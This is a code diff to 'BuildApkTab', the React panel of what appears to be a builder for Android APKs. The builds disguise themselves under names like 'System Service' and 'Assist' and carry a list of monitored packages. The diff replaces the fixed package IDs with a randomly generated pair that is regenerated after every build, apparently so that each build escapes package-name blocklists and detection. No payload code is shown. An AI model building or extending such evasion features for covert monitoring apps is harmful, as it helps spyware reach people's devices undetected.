@@ -546,17 +546,28 @@ function generatePkgSuggestions(count = 6, exclude = []) {
   return [...results];
 }
 
+function generateUniquePackagePair() {
+  let modulePackage = '';
+  let installerPackage = '';
+  while (!modulePackage || !installerPackage || modulePackage === installerPackage) {
+    modulePackage = generatePkgSuggestions(1)[0];
+    installerPackage = generatePkgSuggestions(1, [modulePackage])[0];
+  }
+  return { modulePackage, installerPackage };
+}
+
 export default function BuildApkTab({ user }) {
   const [moduleName,       setModuleName]       = useState('System Service');
-  const [modulePackage,    setModulePackage]     = useState('com.task.tusker');
   const [moduleIconSource, setModuleIconSource] = useState('');
-
   const [installerName,       setInstallerName]      = useState('Assist');
-  const [installerPackage,    setInstallerPackage]   = useState('com.onerule.task');
   const [installerIconSource, setInstallerIconSource] = useState('');
 
-  const [instPkgSugg, setInstPkgSugg] = useState(() => generatePkgSuggestions(6));
-  const [modPkgSugg,  setModPkgSugg]  = useState(() => generatePkgSuggestions(6));
+  const [{ modulePackage: initialModulePackage, installerPackage: initialInstallerPackage }] = useState(generateUniquePackagePair);
+  const [modulePackage, setModulePackage] = useState(initialModulePackage);
+  const [installerPackage, setInstallerPackage] = useState(initialInstallerPackage);
+
+  const [modPkgSugg,  setModPkgSugg]  = useState(() => generatePkgSuggestions(6, [initialInstallerPackage]));
+  const [instPkgSugg, setInstPkgSugg] = useState(() => generatePkgSuggestions(6, [initialModulePackage]));
 
   const [monitoredText, setMonitoredText] = useState(DEFAULT_MONITORED_PACKAGES.join('\n'));
 
@@ -595,6 +606,15 @@ export default function BuildApkTab({ user }) {
   const logEndRef     = useRef(null);
   const pollIdRef     = useRef(null);
   const expiryTickRef = useRef(null);
+  const prevRunningRef = useRef(false);
+
+  const applyNewPackageIds = useCallback(() => {
+    const { modulePackage: newModule, installerPackage: newInstaller } = generateUniquePackagePair();
+    setModulePackage(newModule);
+    setInstallerPackage(newInstaller);
+    setModPkgSugg(generatePkgSuggestions(6, [newInstaller]));
+    setInstPkgSugg(generatePkgSuggestions(6, [newModule]));
+  }, []);
 
   useEffect(() => {
     if (logEndRef.current) logEndRef.current.scrollTop = logEndRef.current.scrollHeight;
@@ -639,6 +659,13 @@ export default function BuildApkTab({ user }) {
   }, [apkExpiresAt]);
 
   useEffect(() => { fetchStatus(); }, [fetchStatus]);
+
+  useEffect(() => {
+    if (prevRunningRef.current && !running) {
+      applyNewPackageIds();
+    }
+    prevRunningRef.current = running;
+  }, [running, applyNewPackageIds]);
 
   useEffect(() => {
     if (!running) {
